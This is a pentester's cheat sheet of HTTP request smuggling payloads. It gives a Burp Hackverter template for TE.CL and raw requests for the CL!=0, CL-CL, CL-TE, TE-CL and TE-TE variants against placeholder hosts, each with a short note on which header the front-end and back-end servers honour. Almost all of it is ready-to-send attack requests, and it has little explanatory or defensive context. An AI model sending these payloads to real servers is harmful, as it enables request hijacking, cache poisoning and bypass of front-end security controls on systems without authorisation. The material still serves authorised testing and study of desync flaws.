Using Hackverter

HTTP Request Smuggling TE.CL
	POST / HTTP/1.1
	Host: vulnerable-website.com
	Content-Length: <@arithmetic(2,'+')><@length><@chunked_dec2hex><@length><@get_chunk/><@/length><@/chunked_dec2hex><@/length><@/arithmetic>
	Transfer-Encoding: chunked

	<@chunked_dec2hex><@length><@get_chunk/><@/length><@/chunked_dec2hex>
	<@set_chunk(false)>SMUGGLED<@/set_chunk>
	0

		#Length shown in the response is in Hex
		#Content-Length in response is based on the number shown for the length of the string (SMUGGLED)
		#so it would be 8\r\n to give a content length of 3

	
********************************************************************

CL! = 0	
GET / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 44\r\n

GET /test HTTP/1.1\r\n
Host: target.com\r\n
\r\n	

Front End Proxy Server: 	Content-Length checked.	
Back End Server: 		Content-Length NOT checked.





CL-CL	
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 8\r\n
Content-Length: 7\r\n

12345\r\n
a	

Front End Proxy Server:		Content-Length is 8 here	
Back End Server:		Content-Length is 7 here





CL-TE	
POST / HTTP/1.1\r\n
Host: target.com\r\n
Connection: keep-alive\r\n
Content-Length: 6\r\n
Transfer-Encoding: chunked\r\n
\r\n
0\r\n
\r\n
G	

Front End Proxy Server:		Processed the Content-Length request header	
Back End Server:		Processed the Transfer-Encoding request header





TE-CL	
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
\r\n
12\r\n
GPOST / HTTP/1.1\r\n
\r\n
0\r\n\
\r\n	

Front End Proxy Server: 	Processed the Transfer-Encoding request header	
Back End Server:		Processed the Content-Length request header.





TE-TE	
POST / HTTP/1.1\r\n
Host: target.com\r\n
Content-Length: 4\r\n
Transfer-Encoding: chunked\r\n
Transfer-Encoding: cow\r\n
\r\n
5c\r\n
GPOST / HTTP/1.1\r\n
Content-Type: application/x-www-form-urlencoded\r\n
Content-Length: 15\r\n
\r\n
x=1\r\n
0\r\n\
\r\n	

Front End Proxy Server: 	Accepts the Transfer-Encoding header. Obfuscation is used to not process the header.	
Back End Server:		Accepts the Transfer-Encoding header. Obfuscation is used to not process the header.



CL = Content-Length
TE = Transfer-Encoding

Burp: Remember to disable the automatic ‘Update Content-Length’ setting from the Repeater menu before manually testing for request smuggling. 
